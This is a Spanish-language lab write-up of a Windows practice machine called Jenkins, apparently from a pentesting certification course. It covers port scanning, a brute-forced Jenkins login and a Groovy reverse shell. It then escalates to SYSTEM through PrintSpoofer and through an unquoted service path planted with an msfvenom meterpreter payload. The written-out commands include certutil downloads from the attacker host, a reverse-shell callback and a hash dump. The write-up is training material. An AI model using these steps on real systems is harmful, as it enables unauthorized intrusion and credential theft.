---
title: Jenkins Writeup - Pentester Mentor Junior (PMJ)
date: 2026-08-12
categories:
  - Writeup
  - PMJ
  - Windows
tags:
  - Writeup
  - PMJ
  - Windows
image: /assets/img/commons/JenkinsWriteup/jenkins_banner.png
---

En esta ocasión estaré resolviendo la máquina **Jenkins**, una máquina Windows de dificultad **Media** perteneciente a la certificación **Pentester Mentor Junior (PMJ)** de la academia **Hacker Mentor**.

El objetivo de este laboratorio es enumerar los servicios expuestos, identificar y explotar un panel de Jenkins con credenciales débiles para lograr ejecución remota de código a través de su consola de Script, y finalmente escalar privilegios hasta convertirme en `NT AUTHORITY\SYSTEM` abusando de un privilegio de impersonación y, de forma alterna, de un servicio de terceros mal configurado.

# Reconocimiento

Lo primero que hice fue verificar que la máquina objetivo estuviera activa dentro de la red.

```
ping 192.168.100.89
```

# Escaneo de puertos y versiones con nmap

Lancé un escaneo con `nmap` para identificar los puertos abiertos, los servicios que corren en ellos y sus versiones, apoyándome también en los scripts NSE por defecto para obtener información adicional.

```bash
sudo nmap -sVC -v --min-rate 6000 -p135,139,445,5040,7680,8080,49664-49668,49670 192.168.68.73 -oA nmap-jenkins
```

![escaneo_puertos](/assets/img/commons/JenkinsWriteup/escaneo_puertos.png)

El escaneo me arrojó los siguientes puertos abiertos:

| Puerto | Servicio | Producto / Versión |
|--------|----------|---------------------|
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | — |
| 5040 | unknown | pando-pub |
| 7680 | unknown | http-proxy |
| 8080 | http | Jetty 9.4.41.v20210516 |
| 49664-49668, 49670 | msrpc | Microsoft Windows RPC |

Algo que me llamó la atención de inmediato fue el puerto **8080** corriendo un servidor **Jetty**, ya que suele ser el puerto por defecto en el que corre **Jenkins**. También pude identificar en la salida del escaneo el nombre del equipo: `BUTLER`.

## Enumeración de recursos compartidos y versión de SMB

Con el puerto 445 abierto, utilicé `crackmapexec` para enumerar información básica del sistema a través de SMB.

```bash
crackmapexec smb 192.168.68.73
```

![enumeracion_smb](/assets/img/commons/JenkinsWriteup/enumeracion_smb.png)

Esto me confirmó que se trataba de un **Windows 10.0 Build 19041 x64** con nombre de equipo `BUTLER`, dominio `Butler`, firma SMB deshabilitada (`signing:False`) y SMBv1 no soportado (`SMBv1:False`).

Aproveché también `whatweb` para obtener más detalles del servicio web en el puerto 8080:

```bash
whatweb http://192.168.68.73:8080
```

Esto me confirmó que efectivamente estaba frente a una instancia de **Jenkins 2.289.3**, corriendo sobre **Jetty 9.4.41.v20210516**, con un formulario de login expuesto.

Para tener certeza sobre la versión de SMB que estaba corriendo, complementé la enumeración usando el módulo auxiliar de Metasploit:

```bash
msf6 auxiliary(scanner/smb/smb_version) > set rhost 192.168.68.73
msf6 auxiliary(scanner/smb/smb_version) > run
```

![smb_version_metasploit](/assets/img/commons/JenkinsWriteup/smb_version_metasploit.png)

## Vista del panel de Jenkins

Al acceder por navegador a `http://192.168.68.73:8080` me encontré con la pantalla de login de Jenkins (**"Welcome to Jenkins!"**), pidiendo usuario y contraseña.

![login_jenkins](/assets/img/commons/JenkinsWriteup/login_jenkins.png)

## Fuzzing de directorios y creación de un diccionario personalizado

Antes de intentar cualquier ataque de fuerza bruta, hice fuzzing sobre el panel web con `gobuster` para descubrir rutas adicionales:

```bash
gobuster dir -u http://192.168.68.73:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b403,404 -r
```

Con los resultados de este fuzzing decidí construir mi propio diccionario de credenciales usando `cewl`, extrayendo las palabras que aparecen en las páginas encontradas (como el formulario de login), en lugar de depender únicamente de diccionarios genéricos.

```bash
cewl http://192.168.68.73:8080 -d 2
cewl http://192.168.68.73:8080/login? -d 2
cewl http://192.168.68.73:8080/login? -d 2 -w dicci1.txt
```

![creacion_diccionario_cewl](/assets/img/commons/JenkinsWriteup/creacion_diccionario_cewl.png)

Repetí este proceso sobre las distintas rutas descubiertas, generando varios mini diccionarios, y luego los concatené y depuré en un único archivo final:

```bash
cat dicci* >> diccionarioFinal.txt   # Concatenar los diccionarios
wc diccionarioFinal.txt              # Saber cuántas líneas tiene el archivo
sudo apt install moreutils
cat diccionarioFinal.txt | sort -u | sponge diccionarioFinal.txt   # Eliminar duplicados
```

# Explotación

## Fuerza bruta con diccionario propio + Burp Suite

Con el diccionario que armé en el paso anterior, utilicé **Burp Suite** para automatizar el envío de combinaciones contra el formulario de login de Jenkins.

![burp_bruteforce](/assets/img/commons/JenkinsWriteup/burp_bruteforce.png)

De esta forma logré dar con unas credenciales válidas: **`jenkins:jenkins`**.

![login_exitoso_jenkins](/assets/img/commons/JenkinsWriteup/login_exitoso_jenkins.png)

## Ejecución remota de código vía Script Console

Una vez dentro del panel con estas credenciales, identifiqué que Jenkins expone una **consola de Script (Groovy)** en la interfaz de administración, la cual permite ingresar y ejecutar código directamente en el servidor. Usé esta funcionalidad para generar y ejecutar una reverse shell.

![consola_expuesta](/assets/img/commons/JenkinsWriteup/consola_expuesta.png)

Con ayuda de [revshells.com](https://www.revshells.com) generé un payload en **Groovy**, indicando mi IP de Kali y el puerto de escucha:

![generador_reverse_shell_groovy](/assets/img/commons/JenkinsWriteup/generador_reverse_shell_groovy.png)

Antes de enviarlo, me puse en escucha:

```bash
nc -lvnp 7070
```

Pegué el payload en la Script Console y lo ejecuté, obteniendo así una shell dentro del sistema como el usuario `butler`.

![usuario_butler](/assets/img/commons/JenkinsWriteup/usuario_butler.png)

En este punto todavía no podía ver la bandera #2, ya que no contaba con los permisos necesarios. La bandera #1, sin embargo, la encontré en `butler\Desktop`.

## Revisión de privilegios del usuario actual

Ya con acceso como `butler`, revisé qué tipo de privilegios tenía habilitados:

```cmd
whoami /priv
```

![whoami_priv](/assets/img/commons/JenkinsWriteup/whoami_priv.png)

Presté especial atención a los privilegios que aparecían como **Enabled**, entre ellos `SeImpersonatePrivilege` y `SeDebugPrivilege`, ya que son claves para posibles rutas de escalada de privilegios en Windows.

También revisé las variables de entorno del sistema:

```cmd
set
```

![variables_entorno](/assets/img/commons/JenkinsWriteup/variables_entorno.png)

Dentro de estas variables presté atención especial a `PATH` y `PATHEXT`, ya que esta última indica el orden en el que Windows busca y ejecuta extensiones cuando no se especifica una: primero `.COM`, luego `.EXE`, y así sucesivamente. Este detalle lo guardé en mente como una posible vía de explotación más adelante.

Adicionalmente, revisé en qué grupos se encontraba mi usuario actual:

```cmd
whoami /groups
net user butler
```

![whoami_groups](/assets/img/commons/JenkinsWriteup/whoami_groups.png)

![net_user_butler](/assets/img/commons/JenkinsWriteup/net_user_butler.png)

Pude confirmar que el usuario `butler` pertenece al grupo local de **Administrators**, aunque, al tratarse de una sesión remota, el token con el que contaba estaba filtrado (UAC remoto), por lo que aún necesitaba escalar privilegios de forma efectiva para operar como administrador real.

## Enumeración automatizada con winPEAS

Para automatizar la búsqueda de posibles vectores de escalada, descargué **winPEAS** desde el repositorio oficial:

```
https://github.com/carlospolop/PEASS-ng/releases/download/20231029-83b8fbe1/winPEASx64_ofs.exe
```

Lo transferí hacia la máquina Jenkins, dentro del directorio `Desktop`, utilizando `certutil`:

```cmd
certutil -urlcache -f LINK wp.exe
wp.exe
```

Al revisar la salida, encontré varios servicios con permisos excesivos (`AllAccess`), y en particular uno llamado **WiseBootAssistant** que además presentaba una ruta de ejecución sin comillas (`unquoted service path`), lo cual es un vector clásico de escalada de privilegios en Windows.

![winpeas_wisebootassistant](/assets/img/commons/JenkinsWriteup/winpeas_wisebootassistant.png)

Bajando un poco más en la salida, confirmé que este servicio tenía permisos de `AllAccess` junto a muchos otros servicios del sistema.

![winpeas_allaccess](/assets/img/commons/JenkinsWriteup/winpeas_allaccess.png)

Con esta información en mano, tenía dos caminos posibles para escalar privilegios: **abuso de tokens** (aprovechando el `SeImpersonatePrivilege`) o la **explotación manual del servicio WiseBootAssistant**. Documenté ambos.

## Escalada de privilegios — Opción 1: Abuso de tokens (PrintSpoofer)

Al tener habilitado `SeImpersonatePrivilege`, opté primero por la vía de abuso de tokens, apoyándome en la documentación de [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) y en la herramienta [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Descargué `PrintSpoofer64.exe` y lo transferí al objetivo por medio de un servidor Python que levanté en mi Kali:

```cmd
certutil -urlcache -f http://192.168.68.72/PrintSpoofer64.exe ps.exe
```

Lo ejecuté indicando el modo interactivo (`-i`) para que cargara una `cmd` directamente:

```cmd
ps.exe -i -c cmd.exe
```

![printspoofer_ejecucion](/assets/img/commons/JenkinsWriteup/printspoofer_ejecucion.png)

Con esto obtuve una consola como `NT AUTHORITY\SYSTEM`. Para dejar constancia del acceso conseguido, cambié la contraseña del usuario `butler`:

```cmd
net user butler 12345
```

## Escalada de privilegios — Opción 2: Explotación manual vía unquoted service path

Como segunda alternativa, decidí explotar manualmente el servicio **WiseBootAssistant** detectado con winPEAS. Primero revisé los servicios registrados en el sistema:

```cmd
reg query hklm\system\currentcontrolset\services
```

![reg_query_services](/assets/img/commons/JenkinsWriteup/reg_query_services.png)

Localicé la entrada correspondiente a `WiseBootAssistant` y consulté sus detalles específicos:

```cmd
reg query HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WiseBootAssistant
```

![reg_query_wisebootassistant](/assets/img/commons/JenkinsWriteup/reg_query_wisebootassistant.png)

La ruta del ejecutable (`ImagePath`) era `C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe`, sin comillas. Como ya había identificado que `PATHEXT` prioriza la búsqueda de `.COM` y `.EXE`, y al no estar la ruta entre comillas, Windows intenta ejecutar, en orden, cada segmento de la ruta como si fuera un binario independiente hasta encontrar uno válido — lo cual abre la puerta a colocar un ejecutable malicioso en una de esas rutas intermedias.

Me moví hacia `C:\Program Files (x86)\Wise\` para comprobar si contaba con permisos de escritura en ese directorio:

```cmd
cd C:\Program Files (x86)\Wise\
echo "" >> file.exe
dir
```

![comprobacion_escritura_wise](/assets/img/commons/JenkinsWriteup/comprobacion_escritura_wise.png)

![comprobacion_escritura_wise_2](/assets/img/commons/JenkinsWriteup/comprobacion_escritura_wise_2.png)

Confirmado que sí podía escribir en esa ruta, generé un payload con `msfvenom`, nombrándolo `Wise.exe` para que coincidiera con el segmento de la ruta sin comillas:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.68.72 LPORT=6060 -f exe -o Wise.exe
```

Transferí el archivo generado hacia la máquina Jenkins usando nuevamente un servidor Python y `certutil`:

```cmd
certutil -urlcache -f http://192.168.68.72/Wise.exe Wise.exe
```

![transferencia_wise_exe](/assets/img/commons/JenkinsWriteup/transferencia_wise_exe.png)

Antes de forzar la ejecución del servicio, dejé el listener preparado en Metasploit:

```bash
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.68.72
set lport 6060
run
```

Ya en la máquina Jenkins, detuve y volví a iniciar el servicio para forzar su ejecución:

```cmd
net stop WiseBootAssistant
net start WiseBootAssistant
```

Al reiniciarse, el servicio intentó cargar el binario original siguiendo la ruta sin comillas, ejecutando en su lugar mi `Wise.exe` con privilegios de `SYSTEM`, ya que el servicio corre bajo ese contexto. Esto me devolvió una sesión de Meterpreter como `NT AUTHORITY\SYSTEM`, con la cual pude, por ejemplo, volcar los hashes del sistema:

```
meterpreter > hashdump
```

![meterpreter_hashdump](/assets/img/commons/JenkinsWriteup/meterpreter_hashdump.png)

> Algo importante a resaltar: en Windows, cuando un servicio intenta iniciarse y falla, termina dándose de baja automáticamente. En este caso, el servicio se cae después de unos 10 segundos aproximadamente, pero para ese momento mi payload ya se había ejecutado y la sesión de Meterpreter ya estaba establecida.

# Conclusión

La máquina **Jenkins** es un buen ejercicio para practicar la explotación de paneles de administración expuestos y la escalada de privilegios en entornos Windows:

1. La identificación del puerto **8080** corriendo **Jetty** me permitió reconocer rápidamente que se trataba de una instancia de **Jenkins**.
2. La construcción de un **diccionario personalizado** con `cewl`, a partir del contenido real de la aplicación, combinada con **Burp Suite**, fue clave para dar con unas credenciales débiles (`jenkins:jenkins`).
3. La **consola de Script (Groovy)** de Jenkins, accesible una vez autenticado, me permitió ejecutar código arbitrario en el servidor y obtener una shell inicial como `butler`.
4. La revisión de privilegios (`whoami /priv`) y la enumeración automatizada con **winPEAS** me permitieron identificar dos rutas de escalada distintas: el **abuso de `SeImpersonatePrivilege`** mediante **PrintSpoofer**, y la explotación manual de un **servicio de terceros con ruta sin comillas y permisos excesivos** (`WiseBootAssistant`).
5. Ambas rutas me permitieron llegar finalmente a una sesión con privilegios de **`NT AUTHORITY\SYSTEM`**.

---

Gracias por leer este writeup.